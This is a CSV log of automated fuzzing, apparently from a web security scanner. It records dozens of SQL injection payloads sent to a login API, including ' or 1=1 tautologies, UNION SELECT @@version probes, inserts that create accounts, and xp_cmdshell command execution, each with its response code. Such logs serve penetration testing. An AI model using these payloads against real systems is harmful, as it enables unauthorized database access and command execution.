Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
112,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,426,633,170,544,14,,,"[insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')), '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
133,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,92,633,215,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), @]"
130,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,633,217,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), a' ]"
132,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,227,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), a' or 1=1; --]"
134,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,94,633,215,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), ?]"
122,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,354,632,96,544,14,,,"[grant connect to name; grant resource to name;, x' and email is NULL; --]"
135,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,234,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), ' and 1=0) union all]"
136,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,633,225,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), ? or 1=1 --]"
139,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,87,633,233,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), anything' or 'x'='x]"
140,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,94,633,257,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), x' and 1=(select count(*) from tabname); --]"
138,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,633,238,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), x' and email is NULL; --]"
142,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,633,241,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), x' or full_name like '%bob%]"
141,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,246,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), x' and members.email is NULL; --]"
143,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,227,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), 23 or 1=1; --]"
128,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,360,633,121,544,14,,,"[grant connect to name; grant resource to name;, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
144,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,633,263,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
145,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,28,544,14,,Reflected,"[a, a]"
148,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,632,40,544,14,,Reflected,"[a, a' or 1=1; --]"
150,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,28,544,14,,Reflected,"[a, ?]"
149,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,92,632,28,544,14,,Reflected,"[a, @]"
147,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,32,544,14,,Reflected,"[a, a' --]"
131,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,422,633,219,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), a' --]"
154,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,632,51,544,14,,Reflected,"[a, x' and email is NULL; --]"
155,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,46,544,14,,Reflected,"[a, anything' or 'x'='x]"
156,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,70,544,14,,Reflected,"[a, x' and 1=(select count(*) from tabname); --]"
157,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,632,59,544,14,,Reflected,"[a, x' and members.email is NULL; --]"
137,Fuzzed,Sat Jan 11 17:02:31 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,450,633,239,544,14,,,"[insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64), x' and userid is NULL; --]"
159,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,40,544,14,,Reflected,"[a, 23 or 1=1; --]"
160,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,76,544,14,,Reflected,"[a, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
162,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,107,632,40,544,14,,,"[' or 1=1 --, a' ]"
153,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,395,632,52,544,14,,Reflected,"[a, x' and userid is NULL; --]"
151,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,437,632,47,544,14,,Reflected,"[a, ' and 1=0) union all]"
165,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,38,544,14,,,"[' or 1=1 --, @]"
161,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,447,632,38,544,14,,Reflected,"[' or 1=1 --, a]"
163,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,393,632,42,544,14,,,"[' or 1=1 --, a' --]"
168,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,48,544,14,,,"[' or 1=1 --, ? or 1=1 --]"
166,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,433,632,38,544,14,,,"[' or 1=1 --, ?]"
158,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,734,632,54,544,14,,Reflected,"[a, x' or full_name like '%bob%]"
171,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,56,544,14,,,"[' or 1=1 --, anything' or 'x'='x]"
172,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,632,80,544,14,,,"[' or 1=1 --, x' and 1=(select count(*) from tabname); --]"
173,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,107,632,69,544,14,,,"[' or 1=1 --, x' and members.email is NULL; --]"
169,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,409,632,62,544,14,,,"[' or 1=1 --, x' and userid is NULL; --]"
174,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,133,632,64,544,14,,,"[' or 1=1 --, x' or full_name like '%bob%]"
164,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,742,632,50,544,14,,,"[' or 1=1 --, a' or 1=1; --]"
175,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,632,50,544,14,,,"[' or 1=1 --, 23 or 1=1; --]"
177,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,56,544,14,,Reflected,"[' union (select @@version) --, a]"
179,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,108,632,60,544,14,,,"[' union (select @@version) --, a' --]"
181,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,56,544,14,,,"[' union (select @@version) --, @]"
170,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,769,632,61,544,14,,,"[' or 1=1 --, x' and email is NULL; --]"
176,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,477,632,86,544,14,,,"[' or 1=1 --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
183,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,75,544,14,,,"[' union (select @@version) --, ' and 1=0) union all]"
178,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,521,632,58,544,14,,,"[' union (select @@version) --, a' ]"
180,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,429,632,68,544,14,,,"[' union (select @@version) --, a' or 1=1; --]"
186,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,79,544,14,,,"[' union (select @@version) --, x' and email is NULL; --]"
187,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,74,544,14,,,"[' union (select @@version) --, anything' or 'x'='x]"
189,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,632,87,544,14,,,"[' union (select @@version) --, x' and members.email is NULL; --]"
190,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,82,544,14,,,"[' union (select @@version) --, x' or full_name like '%bob%]"
185,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,442,632,80,544,14,,,"[' union (select @@version) --, x' and userid is NULL; --]"
182,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,719,632,56,544,14,,,"[' union (select @@version) --, ?]"
191,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,156,632,68,544,14,,,"[' union (select @@version) --, 23 or 1=1; --]"
188,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,418,632,98,544,14,,,"[' union (select @@version) --, x' and 1=(select count(*) from tabname); --]"
146,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,2305,632,30,544,14,,Reflected,"[a, a' ]"
192,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,104,544,14,,,"[' union (select @@version) --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
193,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,71,544,14,,Reflected,"[' union (select NULL, (select @@version)) --, a]"
184,Fuzzed,Sat Jan 11 17:02:33 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,679,632,66,544,14,,,"[' union (select @@version) --, ? or 1=1 --]"
195,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,75,544,14,,,"[' union (select NULL, (select @@version)) --, a' --]"
197,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,71,544,14,,,"[' union (select NULL, (select @@version)) --, @]"
200,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,81,544,14,,,"[' union (select NULL, (select @@version)) --, ? or 1=1 --]"
201,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,632,95,544,14,,,"[' union (select NULL, (select @@version)) --, x' and userid is NULL; --]"
203,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,89,544,14,,,"[' union (select NULL, (select @@version)) --, anything' or 'x'='x]"
194,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,425,632,73,544,14,,,"[' union (select NULL, (select @@version)) --, a' ]"
198,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,418,632,71,544,14,,,"[' union (select NULL, (select @@version)) --, ?]"
204,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,113,544,14,,,"[' union (select NULL, (select @@version)) --, x' and 1=(select count(*) from tabname); --]"
205,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,102,544,14,,,"[' union (select NULL, (select @@version)) --, x' and members.email is NULL; --]"
199,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,474,632,90,544,14,,,"[' union (select NULL, (select @@version)) --, ' and 1=0) union all]"
206,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,632,97,544,14,,,"[' union (select NULL, (select @@version)) --, x' or full_name like '%bob%]"
202,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,416,632,94,544,14,,,"[' union (select NULL, (select @@version)) --, x' and email is NULL; --]"
208,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,633,119,544,14,,,"[' union (select NULL, (select @@version)) --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
209,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,77,544,14,,Reflected,"[' union (select NULL, NULL, (select @@version)) --, a]"
210,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,108,632,79,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, a' ]"
213,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,77,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, @]"
214,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,106,632,77,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, ?]"
216,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,190,632,87,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, ? or 1=1 --]"
207,Fuzzed,Sat Jan 11 17:02:34 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,754,632,83,544,14,,,"[' union (select NULL, (select @@version)) --, 23 or 1=1; --]"
211,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,737,632,81,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, a' --]"
217,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,417,633,101,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, x' and userid is NULL; --]"
215,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,691,632,96,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, ' and 1=0) union all]"
219,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,95,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, anything' or 'x'='x]"
221,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,108,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, x' and members.email is NULL; --]"
222,Fuzzed,Sat Jan 11 17:02:35 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,633,103,544,14,,,"[' union (select NULL, NULL, (select @@version)) --, x' or full_name like '%bob%]"
